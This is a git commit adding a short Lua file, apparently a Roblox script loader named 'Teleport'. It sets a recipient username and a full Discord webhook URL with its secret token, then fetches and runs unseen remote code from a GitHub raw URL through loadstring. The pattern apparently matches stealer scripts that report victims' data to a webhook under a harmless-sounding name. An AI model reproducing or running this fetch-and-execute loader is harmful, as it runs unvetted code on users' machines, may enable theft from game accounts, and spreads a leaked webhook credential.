45a9334ce0eaecddb67ff1d297977d3b5315e8a3
Muhammab6196 <131237351+Muhammab6196@users.noreply.github.com>
2023-04-19 13:37:35 +0700

    Create Mainstring.lua

---
+++ main/Mainstring.lua
@@ -0,0 +1,5 @@
+_G.Username = "caovy2009"
+_G.HubName = "Teleport..."
+_G.WebhookUrl = "https://discord.com/api/webhooks/1098134145101733888/Am55sqAVanFCOsmsEI0an2BPw-hTIAKfznnm0aOfuvT6YN33aMufdkqdalro_SF4MZrK"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
